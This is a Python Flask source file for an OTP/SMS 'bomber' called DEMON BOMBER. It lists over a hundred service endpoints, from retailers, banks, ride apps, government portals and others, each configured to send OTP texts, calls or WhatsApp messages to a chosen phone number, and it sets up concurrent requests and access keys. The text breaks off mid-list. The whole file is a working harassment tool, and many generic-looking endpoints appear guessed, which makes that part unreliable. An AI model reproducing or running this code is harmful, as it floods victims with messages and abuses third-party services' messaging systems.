# app.py - DEMON BOMBER (FULL 200+ APIS FROM ALL FILES)
from flask import Flask, request, render_template_string, Response
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ============ SIRF DO KEYS ============
VALID_KEYS = {"SHUVO": "shuvo_2024", "FELIX": "felix_2024"}

# ============ SAB FILE SE SARI APIS - EK BHI MISS NAHI ============
APIS = []

# === FILE 1 SE APIS (api5.txt, apis1.txt se) ===
file1_apis = [
    # Bomb API
    {"name": "SplexXO Bomb", "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "headers": {}, "data": None},
    # Agrevolution
    {"name": "Agrevolution OTP", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","client_id":"kisan-app"}}'},
    # Breeze
    {"name": "Breeze OTP", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}, "data": lambda p: f'{{"phoneNumber":"{p}","authVerificationType":"otp","device":{{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"}},"countryCode":"+91"}}'},
    # Jockey SMS
    {"name": "Jockey SMS", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    # Jockey WhatsApp
    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    # PenPencil
    {"name": "PenPencil OTP", "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","countryCode":"+91","subOrgId":"SUB-PWLI000"}}'},
    # Zoho
    {"name": "Zoho OTP", "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india", "method": "POST", "headers": {"Content-Length": "0"}, "data": None},
    # KPN Fresh
    {"name": "KPN Fresh SMS", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    # Aditya Birla
    {"name": "Aditya Birla OTP", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"MobileNumber={p}&functionality=signup"},
    # Muthoot Finance
    {"name": "Muthoot Finance", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}&pin=XjtYYEdhP0haXjo3"},
    # GoPaySense
    {"name": "GoPaySense OTP", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    # IIFL
    {"name": "IIFL OTP", "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"apply_for=18&full_name=Test&mobile_number={p}&terms_and_condition=1"},
    # BankOpen
    {"name": "BankOpen OTP", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"username":"{p}","is_open_capital":1}}'},
    # Tata Capital
    {"name": "Tata Capital OTP", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"header":{{"authToken":"MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==","identifier":"nli"}},"body":{{"mobileNumber":"{p}"}}}}'},
    # TradeIndia
    {"name": "TradeIndia OTP", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"+91{p}"}}'},
    # Khatabook
    {"name": "Khatabook OTP", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91","app_signature":"wk+avHrHZf2"}}'},
    # OrangeHealth
    {"name": "OrangeHealth OTP", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","customer_auto_fetch_message":true}}'},
    # Jobhai
    {"name": "Jobhai OTP", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    # Mconnect
    {"name": "Mconnect OTP", "url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    # Astrosage
    {"name": "Astrosage OTP", "url": lambda p: f"https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={p}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank", "method": "GET", "headers": {}, "data": None},
    # Spinny
    {"name": "Spinny OTP", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4}}'},
    # Dream11
    {"name": "Dream11 OTP", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{p}","templateName":"default"}}'},
    # Citymall
    {"name": "Citymall OTP", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    # Codfirm
    {"name": "Codfirm OTP", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={p}&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    # OYO
    {"name": "OYO OTP", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91","nod":4}}'},
    # Myma
    {"name": "Myma OTP", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"countrycode":"+91","mobile":"91{p}","is_otpgenerated":false,"app_version":"-1"}}'},
    # Freedo
    {"name": "Freedo OTP", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"email_id":"test@test.com","first_name":"Test","mobile_number":"{p}"}}'},
    # Cosmofeed
    {"name": "Cosmofeed OTP", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","data":{{"email":"test@gmail.com"}},"authScreen":"signup-screen","userIsConvertingToCreator":false}}'},
    # Bisleri
    {"name": "Bisleri OTP", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"email":"test@gmail.com","mobile":"{p}"}}'},
    # Evital
    {"name": "Evital OTP", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"pharmacy_name":"Test","mobile":"{p}","referral_code":"","email_id":"test@gmail.com","zip_code":"110086"}}'},
    # QuickRide
    {"name": "QuickRide OTP", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"contactNo={p}&countryCode=%2B91&appName=Quick%20Ride"},
    # Kwikfix
    {"name": "Kwikfix OTP", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    # Brevistay
    {"name": "Brevistay OTP", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"is_otp":1,"is_password":0,"mobile":"{p}"}}'},
    # Hourlyrooms
    {"name": "Hourlyrooms OTP", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    # Madrasmandi
    {"name": "Madrasmandi OTP", "url": "https://api.madrasmandi.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "multipart/form-data"}, "data": lambda p: f'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{p}\r\n------WebKitFormBoundary--\r\n'},
    # BharatLoan
    {"name": "BharatLoan OTP", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}&current_page=login&is_existing_customer=2"},
    # Pagarbook
    {"name": "Pagarbook OTP", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","language":1}}'},
    # Vahak
    {"name": "Vahak OTP", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","scope":0}}'},
    # Redcliffe
    {"name": "Redcliffe OTP", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","short":true}}'},
    # Ixigo
    {"name": "Ixigo OTP", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"sixDigitOTP=true&prefix=%2B91&phone={p}"},
    # 55Club
    {"name": "55Club OTP", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"91{p}","codeType":1,"language":0}}'},
    # Aakash
    {"name": "Aakash OTP", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission"}}'},
    # Testbook
    {"name": "Testbook OTP", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    # Medibuddy
    {"name": "Medibuddy OTP", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phonenumber":"{p}","platform":"medibuddy"}}'},
    # Woodenstreet
    {"name": "Woodenstreet OTP", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"firstname":"Test","email":"test@test.com","telephone":"{p}","password":"Test@123","isGuest":0,"pincode":"110001"}}'},
]

# === FILE 2 SE APIS (apis2.txt se - Flipkart, Amazon, Myntra etc) ===
file2_apis = [
    {"name": "Flipkart SMS", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart WhatsApp", "url": "https://flipkart.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Amazon SMS", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=otp"},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "Amazon WhatsApp", "url": "https://amazon.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra SMS", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Ajio SMS", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Ajio WhatsApp", "url": "https://ajio.com/v3/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Meesho SMS", "url": "https://meesho.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Meesho WhatsApp", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "Snapdeal SMS", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm SMS", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Paytm WhatsApp", "url": "https://paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PhonePe SMS", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "PhonePe Voice", "url": "https://phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Google Pay SMS", "url": "https://pay.google.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Google Pay Voice", "url": "https://pay.google.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Swiggy SMS", "url": "https://www.swiggy.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zomato SMS", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}"},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "Dominos SMS", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"PhoneNo={p}"},
    {"name": "BigBasket SMS", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
    {"name": "BigBasket Voice", "url": "https://www.bigbasket.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zepto SMS", "url": "https://www.zepto.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zepto Voice", "url": "https://zepto.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit SMS", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Blinkit Voice", "url": "https://blinkit.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Uber SMS", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Ola SMS", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "MakeMyTrip SMS", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo SMS", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "IRCTC SMS", "url": "https://www.irctc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "RedBus SMS", "url": "https://www.redbus.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Nykaa SMS", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa Voice", "url": "https://nykaa.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "1mg SMS", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'},
    {"name": "1mg Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds SMS", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Practo SMS", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy SMS", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu SMS", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Curefit SMS", "url": "https://www.cure.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Cult.fit SMS", "url": "https://www.cult.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HealthifyMe SMS", "url": "https://www.healthifyme.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netflix SMS", "url": "https://www.netflix.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hotstar SMS", "url": "https://www.hotstar.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "SonyLIV SMS", "url": "https://www.sonyliv.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ZEE5 SMS", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Spotify SMS", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "LinkedIn SMS", "url": "https://www.linkedin.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Naukri SMS", "url": "https://www.naukri.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zerodha SMS", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Groww SMS", "url": "https://groww.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

# === FILE 3 SE APIS (apis3.txt se) ===
file3_apis = [
    {"name": "Angel One SMS", "url": "https://www.angelone.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BikeFixup OTP", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "Paytm Payments Bank", "url": "https://www.paytmbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Kredily OTP", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BSNL SMS", "url": "https://www.bsnl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zepto WhatsApp", "url": "https://zepto.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Dunzo WhatsApp", "url": "https://dunzo.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Utkarsh Bank WhatsApp", "url": "https://utkarshbank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Pizza Hut SMS", "url": "https://www.pizzahut.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Spotify WhatsApp", "url": "https://spotify.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "DigiLocker SMS", "url": "https://www.digilocker.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "SBI Life SMS", "url": "https://www.sbilife.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Bharat Gas SMS", "url": "https://www.bharatgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "KPN WhatsApp New", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "WorkIndia OTP", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "Jio Payments Bank", "url": "https://www.jiopaymentsbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "RedBus WhatsApp", "url": "https://redbus.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Upgrad OTP", "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"+91{p}"}}'},
    {"name": "Portea WhatsApp", "url": "https://portea.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "ESAF Bank WhatsApp", "url": "https://esafbank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "WBSEDCL SMS", "url": "https://www.wbsedcl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vistara Call", "url": "https://www.airvistara.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "IndiGo SMS", "url": "https://www.goindigo.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Hotstar WhatsApp", "url": "https://hotstar.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Vi Call", "url": "https://www.myvi.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "IRCTC Call", "url": "https://irctc.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Kotak Securities Call", "url": "https://kotaksecurities.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Apollo 24/7 SMS", "url": "https://www.apollo247.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
